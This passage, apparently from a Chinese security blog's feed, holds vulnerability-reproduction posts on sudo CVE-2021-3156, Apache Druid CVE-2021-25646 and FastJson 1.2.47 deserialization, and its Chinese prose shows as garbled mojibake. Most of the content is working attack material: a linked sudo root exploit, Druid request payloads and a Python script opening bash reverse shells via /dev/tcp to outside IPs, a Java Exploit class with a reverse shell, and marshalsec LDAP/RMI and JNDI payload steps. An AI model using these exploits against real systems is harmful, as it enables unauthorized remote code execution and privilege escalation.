]]></content>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>Sudoç¼“å†²åŒºæº¢å‡º</title>
    <url>/posts/39897303/</url>
    <content><![CDATA[<p>sudoç¼“å†²åŒºæº¢å‡ºã€‚ã€‚ç”¨äºæœ¬ææƒã€‚</p>
<a id="more"></a>

<h2 id="ç®€è¿°"><a href="#ç®€è¿°" class="headerlink" title="ç®€è¿°"></a>ç®€è¿°</h2><p>1æœˆ26æ—¥ï¼Œsudoå‘å¸ƒå®‰å…¨é€šå‘Šï¼Œä¿®å¤äº†ä¸€ä¸ªç±»Unixæ“ä½œç³»ç»Ÿåœ¨å‘½ä»¤å‚æ•°ä¸­è½¬ä¹‰åæ–œæ æ—¶å­˜åœ¨åŸºäºå †çš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚å½“sudoé€šè¿‡-sæˆ–-iå‘½ä»¤è¡Œé€‰é¡¹åœ¨shellæ¨¡å¼ä¸‹è¿è¡Œå‘½ä»¤æ—¶ï¼Œå®ƒå°†åœ¨å‘½ä»¤å‚æ•°ä¸­ä½¿ç”¨åæ–œæ è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ã€‚ä½†ä½¿ç”¨-sæˆ– -iæ ‡å¿—è¿è¡Œsudoeditæ—¶ï¼Œå®é™…ä¸Šå¹¶æœªè¿›è¡Œè½¬ä¹‰ï¼Œä»è€Œå¯èƒ½å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºã€‚åªè¦å­˜åœ¨sudoersæ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯  /etc/sudoersï¼‰ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨æœ¬åœ°æ™®é€šç”¨æˆ·åˆ©ç”¨sudoè·å¾—ç³»ç»Ÿrootæƒé™ã€‚è¯·å—å½±å“çš„ç”¨æˆ·å°½å¿«é‡‡å–æªæ–½è¿›è¡Œé˜²æŠ¤ã€‚</p>
<h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sudo 1.8.2 - 1.8.31p2</span><br><span class="line">Sudo 1.9.0 - 1.9.5p1</span><br></pre></td></tr></table></figure>

<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>å¦‚ä¸‹EXPå¤ç°ç‰ˆæœ¬</p>
<ul>
<li><p>ubuntuç‰ˆæœ¬ä¸º <strong>20.04</strong></p>
</li>
<li><p>sudoç‰ˆæœ¬ä¸º <strong>1.8.31</strong></p>
</li>
</ul>
<p>ä¸‹è½½åœ°å€ï¼š</p>
<ul>
<li><a href="Sudo%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/CVE-2021-3156_nss_poc_ubuntu.tar.gz">CVE-2021-3156_nss_poc_ubuntu.tar.gz</a></li>
<li>MD5 (CVE-2021-3156_nss_poc_ubuntu.tar.gz) = 9951d863ba65db5f168849e50762becc</li>
</ul>
<ol>
<li>è§£å‹å¹¶ç¼–è¯‘å½“ä¸‹expæ–‡ä»¶ï¼ˆ<code>make</code>åç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶<code>sudo-hax-me-a-sandwich</code>ï¼‰</li>
<li>æ‰§è¡Œ<code>sudo-hax-me-a-sandwich</code>å®Œæˆææƒ</li>
</ol>
<p><img src="/posts/39897303/1110131194011.png" alt="1111"></p>
]]></content>
      <tags>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Druidè¿œç¨‹ä»£ç æ‰§è¡Œ</title>
    <url>/posts/2c3993f7/</url>
    <content><![CDATA[<p>Apache Druidè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2021-25646ï¼‰ã€‚ã€‚ã€‚</p>
<a id="more"></a>



<h1 id="Apache-Druidè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2021-25646ï¼‰"><a href="#Apache-Druidè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2021-25646ï¼‰" class="headerlink" title="Apache Druidè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2021-25646ï¼‰"></a>Apache Druidè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2021-25646ï¼‰</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Apache Druid æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼çš„æ•°æ®å¤„ç†ç³»ç»Ÿã€‚Apache  DruidåŒ…æ‹¬æ‰§è¡Œç”¨æˆ·æä¾›çš„JavaScriptçš„åŠŸèƒ½åµŒå…¥åœ¨å„ç§ç±»å‹è¯·æ±‚ä¸­çš„ä»£ç ã€‚åœ¨Druid  0.20.0åŠæ›´ä½ç‰ˆæœ¬ä¸­ï¼Œç”¨æˆ·å‘é€æ¶æ„è¯·æ±‚ï¼Œåˆ©ç”¨Apache Druidæ¼æ´å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚æ”»å‡»è€…å¯ç›´æ¥æ„é€ æ¶æ„è¯·æ±‚æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ§åˆ¶æœåŠ¡å™¨ã€‚</p>
<h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p>Apache Druid &lt; 0.20.1</p>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul>
<li>æ‹‰å–Dockeré•œåƒï¼ˆå‹æƒ…æç¤ºï¼šè¯¥dockerç¯å¢ƒå†MACä¸‹ï¼Œç‰¹åˆ«ä¸çˆ½ã€‚ã€‚ï¼‰</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull fokkodriesprong/docker-druid <span class="comment">#æ‹‰å–é•œåƒ</span></span><br><span class="line">docker run --rm -i -p 8888:8888  fokkodriesprong/docker-druid <span class="comment">#å¯åŠ¨é•œåƒ</span></span><br></pre></td></tr></table></figure>

<h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><p>åœ¨è·¯å¾„<code>Load data-&gt;Local disk</code>ï¼Œå³ä¾§è¡¨å•éšæ„å¡«å†™ï¼Œä¸‹ä¸€æ­¥ä¹‹åé€‰æ‹©<code>json</code>,ç»§ç»­ä¸‹ä¸€æ­¥,<code>time_column</code>æ—¶é€‰æ‹©isoï¼Œç›´åˆ°çœ‹åˆ°å³ä¸‹è§’å‡ºç°<code>Next Filter</code>ï¼Œç‚¹å‡»ä¹‹åæŠ“åŒ…ã€‚</p>
<p><img src="/posts/2c3993f7/image-20210203151548692.png" alt="image-20210203151548692"></p>
<p>æ•°æ®åŒ…å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /druid/indexer/v1/sampler?<span class="keyword">for</span>=filter HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line">Content-Length: 605</span><br><span class="line">Origin: http://127.0.0.1:8888</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1:8888/unified-console.html</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;firehose&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;local&quot;</span>,<span class="string">&quot;baseDir&quot;</span>:<span class="string">&quot;/opt/&quot;</span>,<span class="string">&quot;filter&quot;</span>:<span class="string">&quot;&quot;</span>&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;parser&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;string&quot;</span>,<span class="string">&quot;parseSpec&quot;</span>:&#123;<span class="string">&quot;format&quot;</span>:<span class="string">&quot;json&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;time&quot;</span>,<span class="string">&quot;format&quot;</span>:<span class="string">&quot;iso&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;&#125;&#125;,<span class="string">&quot;transformSpec&quot;</span>:&#123;<span class="string">&quot;transforms&quot;</span>:[],<span class="string">&quot;filter&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;javascript&quot;</span>,</span><br><span class="line"><span class="string">&quot;function&quot;</span>:<span class="string">&quot;function(value)&#123;return java.lang.Runtime.getRuntime().exec(&#x27;/bin/bash -c <span class="variable">$@</span>|bash 0 echo bash -i &gt;&amp; /dev/tcp/10.10.12.189/4444 0&gt;&amp;1&#x27;)&#125;&quot;</span>,</span><br><span class="line"><span class="string">&quot;dimension&quot;</span>:<span class="string">&quot;added&quot;</span>,</span><br><span class="line"><span class="string">&quot;&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;enabled&quot;</span>:<span class="string">&quot;true&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;&#125;&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:500,<span class="string">&quot;timeoutMs&quot;</span>:15000&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2c3993f7/image-20210203151155054.png" alt="image-20210203151155054"></p>
<p><strong>PYåå¼¹è„šæœ¬</strong></p>
<p>å°±å¾ˆå¥‡æ€ªï¼Œä¸Šé¢çš„payloadä¸é€šç”¨ã€‚ã€‚ã€‚å¦‚ä¸‹æ‰èƒ½åå¼¹ã€‚ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">	<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">druid_exec</span>(<span class="params">url</span>):</span></span><br><span class="line">	data = <span class="string">&#x27;&#x27;&#x27;&#123;&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123;&quot;ioConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: &#123;&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;&#123;\\&quot;isRobot\\&quot;:true,\\&quot;channel\\&quot;:\\&quot;#x\\&quot;,\\&quot;timestamp\\&quot;:\\&quot;2020-12-12T12:10:21.040Z\\&quot;,\\&quot;flags\\&quot;:\\&quot;x\\&quot;,\\&quot;isUnpatrolled\\&quot;:false,\\&quot;page\\&quot;:\\&quot;1\\&quot;,\\&quot;diffUrl\\&quot;:\\&quot;https://xxx.com\\&quot;,\\&quot;added\\&quot;:1,\\&quot;comment\\&quot;:\\&quot;Botskapande Indonesien omdirigering\\&quot;,\\&quot;commentLength\\&quot;:35,\\&quot;isNew\\&quot;:true,\\&quot;isMinor\\&quot;:false,\\&quot;delta\\&quot;:31,\\&quot;isAnonymous\\&quot;:true,\\&quot;user\\&quot;:\\&quot;Lsjbot\\&quot;,\\&quot;deltaBucket\\&quot;:0,\\&quot;deleted\\&quot;:0,\\&quot;namespace\\&quot;:\\&quot;Main\\&quot;&#125;&quot;&#125;, &quot;inputFormat&quot;: &#123;&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true&#125;&#125;, &quot;dataSchema&quot;: &#123;&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: &#123;&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;transformSpec&quot;: &#123;&quot;transforms&quot;: [], &quot;filter&quot;: &#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#x27;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/ip/12365 0&gt;&amp;1&#x27;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;&#125;&#125;, &quot;samplerConfig&quot;: &#123;&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000&#125;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">	print(data)</span><br><span class="line">	headers = &#123;</span><br><span class="line">		<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&quot;</span>,</span><br><span class="line">		<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">		<span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">		<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json;charset=utf-8&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		res = requests.post(url + <span class="string">&#x27;/druid/indexer/v1/sampler?for=filter&#x27;</span>,headers=headers,data=data,proxies=proxies)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	druid_exec(<span class="string">&#x27;http://x x x x x&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><p><strong>ä¿®å¤æ–¹å¼</strong></p>
<p>å‡çº§åˆ°æœ€æ–°ç‰ˆApache Druid 0.20.1</p>
<p>ä¸‹è½½é“¾æ¥ï¼š<span class="exturl" data-url="aHR0cHM6Ly9kcnVpZC5hcGFjaGUub3JnL2Rvd25sb2Fkcy5odG1s">https://druid.apache.org/downloads.html<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
  </entry>
  <entry>
    <title>FastJson 1.2.47 ååºåˆ—åŒ–å¤ç°</title>
    <url>/posts/32c3cb6e/</url>
    <content><![CDATA[<p>FASTJSONâ€¦â€¦ååºåˆ—åŒ–åˆ©ç”¨ã€‚ã€‚ã€‚</p>
<a id="more"></a>



<h2 id="FastJson-lt-1-2-47-ååºåˆ—åŒ–å¤ç°"><a href="#FastJson-lt-1-2-47-ååºåˆ—åŒ–å¤ç°" class="headerlink" title="FastJson &lt; 1.2.47 ååºåˆ—åŒ–å¤ç°"></a>FastJson &lt; 1.2.47 ååºåˆ—åŒ–å¤ç°</h2><p>æœ‰æ—¶é—´å†é‡å†™å·¥å…·ã€‚æš‚æ—¶æ‰‹å·¥è¿›è¡Œå§ã€‚</p>
<h2 id="å‰æ"><a href="#å‰æ" class="headerlink" title="å‰æ"></a>å‰æ</h2><ol>
<li>å®‰è£…docker</li>
<li>ä¸‹è½½vulhubï¼Œè¿è¡Œfastjson 1.2.47ç¯å¢ƒã€‚</li>
<li>é…ç½®JAVAç¯å¢ƒï¼Œç‰ˆæœ¬å’Œ<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21iZWNobGVyL21hcnNoYWxzZWMlRTQlQjglQURwb20ueG1sJUU3JTlBJTg0JUU0JUI4JTgwJUU4JTg3JUI0">https://github.com/mbechler/marshalsecä¸­pom.xmlçš„ä¸€è‡´<i class="fa fa-external-link-alt"></i></span></li>
<li>é…ç½®JAVA_HOME </li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># MACä¸‹é…ç½®</span></span><br><span class="line">/usr/libexec/java_home</span><br><span class="line">vim .zshrc</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=<span class="string">&quot;/Library/Java/JavaVirtualMachines/jdk1.8.0_251.jdk/Contents/Home&quot;</span></span><br><span class="line"><span class="built_in">source</span> ../../../../.zshrc</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mbechler/marshalsec.git</span><br><span class="line"><span class="built_in">cd</span> marshalsec</span><br><span class="line">mvn install <span class="comment"># æŠ¥é”™ï¼Œç»§ç»­æ‰§è¡Œä¸‹åˆ—å‘½ä»¤</span></span><br><span class="line">mvn compiler:compile</span><br><span class="line">mvn org.apache.maven.plugins:maven-compiler-plugin:compile</span><br><span class="line">mvn org.apache.maven.plugins:maven-compiler-plugin:2.0.2:compile</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>

<h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><h3 id="ç¬¬ä¸€æ­¥ï¼šè„šæœ¬"><a href="#ç¬¬ä¸€æ­¥ï¼šè„šæœ¬" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šè„šæœ¬"></a>ç¬¬ä¸€æ­¥ï¼šè„šæœ¬</h3><p>å‡†å¤‡æ¼æ´åˆ©ç”¨è„šæœ¬</p>
<ul>
<li>ä¿®æ”¹è„šæœ¬ä½¿ç”¨bashåå¼¹ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;,&quot;/c&quot;,&quot;whoami&quot;&#125;);</span></span><br><span class="line">      Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/192.168.30.51/1234;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¼–è¯‘,æ³¨æ„æ–‡ä»¶åä¸ªç±»åä¸€è‡´ã€‚</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure>

<h3 id="ç¬¬äºŒæ­¥ï¼šRMI-LADP"><a href="#ç¬¬äºŒæ­¥ï¼šRMI-LADP" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šRMI/LADP"></a>ç¬¬äºŒæ­¥ï¼šRMI/LADP</h3><p>å‡†å¤‡marshalsecå¯åŠ¨ä¸€ä¸ªRMIæœåŠ¡å™¨ï¼Œæˆ–è€…ladpæœåŠ¡å™¨ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mbechler/marshalsec.git</span><br><span class="line"><span class="built_in">cd</span> marshalsec</span><br><span class="line">mvn install <span class="comment"># æŠ¥é”™ï¼Œç»§ç»­æ‰§è¡Œä¸‹åˆ—å‘½ä»¤</span></span><br><span class="line">mvn compiler:compile</span><br><span class="line">mvn org.apache.maven.plugins:maven-compiler-plugin:compile</span><br><span class="line">mvn org.apache.maven.plugins:maven-compiler-plugin:2.0.2:compile</span><br><span class="line">mvn clean package -DskipTests</span><br><span class="line"><span class="comment"># ç¼–è¯‘å¥½äº†åœ¨targetç›®å½•ä¸‹</span></span><br></pre></td></tr></table></figure>

<h3 id="ç¬¬ä¸‰æ­¥ï¼šHTTPæœåŠ¡å™¨"><a href="#ç¬¬ä¸‰æ­¥ï¼šHTTPæœåŠ¡å™¨" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šHTTPæœåŠ¡å™¨"></a>ç¬¬ä¸‰æ­¥ï¼šHTTPæœåŠ¡å™¨</h3><ul>
<li>å¯ç”¨HTTPæœåŠ¡ï¼Œæ ¹ç›®å½•æ”¾Exploit.class</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server  <span class="comment"># é»˜è®¤å½“å‰æ–‡ä»¶å¤¹å¼€å¯HTTPï¼Œç«¯å£é»˜è®¤8000</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å¼€å¯LDAP</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://192.168.30.51:8000/#Exploit&quot;</span> 9999</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç†è®ºä¸ŠRIMIä¸è¡Œã€‚</span></span><br><span class="line"><span class="comment"># java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://x.x.x.x/#Exploit&quot; 9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœé‡‡ç”¨äº†RMIï¼Œä½¿ç”¨å¦‚ä¸‹ä»£ç ã€‚POST</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://x.x.x.x/:9999/Exploit&quot;</span>, </span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>å¼€å¯NCç›‘å¬</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>

<h3 id="ç¬¬å››æ­¥ï¼šåˆ©ç”¨"><a href="#ç¬¬å››æ­¥ï¼šåˆ©ç”¨" class="headerlink" title="ç¬¬å››æ­¥ï¼šåˆ©ç”¨"></a>ç¬¬å››æ­¥ï¼šåˆ©ç”¨</h3><p>è®¿é—®ä¸»é¡µï¼ŒBurpæŠ“åŒ…ã€‚ä¿®æ”¹è¯·æ±‚,å‘é€å³å¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Content-Length: 277</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://192.168.30.51:9999/Exploit&quot;</span>, </span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>å³å¯ã€‚</p>
<p><img src="/posts/32c3cb6e/001.png" alt="image-20200506161748536"></p>
<h2 id="é«˜ç‰ˆæœ¬JDK"><a href="#é«˜ç‰ˆæœ¬JDK" class="headerlink" title="é«˜ç‰ˆæœ¬JDK"></a>é«˜ç‰ˆæœ¬JDK</h2><p>é«˜ç‰ˆæœ¬çš„javaå¯¹jndiæ³¨å…¥è¿›è¡Œäº†é™åˆ¶ï¼Œç”±äºç¯å¢ƒçš„ä¸åŒï¼Œå­˜åœ¨ä¸€äº›æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œè¿™é‡Œæ¨èä¸‹å›½å¤–Michael Stepankinå¤§ç‰›çš„æ–¹æ³•ã€‚<span class="exturl" data-url="aHR0cHM6Ly93d3cudmVyYWNvZGUuY29tL2Jsb2cvcmVzZWFyY2gvZXhwbG9pdGluZy1qbmRpLWluamVjdGlvbnMtamF2YQ==">https://www.veracode.com/blog/research/exploiting-jndi-injections-java<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="ç¬¬ä¸€æ­¥ï¼šå·¥å…·å‡†å¤‡"><a href="#ç¬¬ä¸€æ­¥ï¼šå·¥å…·å‡†å¤‡" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šå·¥å…·å‡†å¤‡"></a>ç¬¬ä¸€æ­¥ï¼šå·¥å…·å‡†å¤‡</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mpgn/Spring-Boot-Actuator-Exploit</span><br><span class="line"><span class="comment"># ä¿®æ”¹Spring-Boot-Actuator-Exploit\maliciousRMIServer\src\main\java\hello\EvilRMIServer.javaçš„ä»£ç ã€‚å¯ä»¥ä¿®æ”¹RMIè¿œç¨‹ç›‘å¬çš„ç«¯å£ï¼Œå’Œæ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ã€‚</span></span><br><span class="line"><span class="built_in">cd</span> Spring-Boot-Actuator-Exploit</span><br><span class="line"><span class="built_in">cd</span> maliciousRMIServer</span><br><span class="line">mvn clean install</span><br></pre></td></tr></table></figure>

<h3 id="ç¬¬äºŒæ­¥ï¼šRMI"><a href="#ç¬¬äºŒæ­¥ï¼šRMI" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šRMI"></a>ç¬¬äºŒæ­¥ï¼šRMI</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.30.51 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

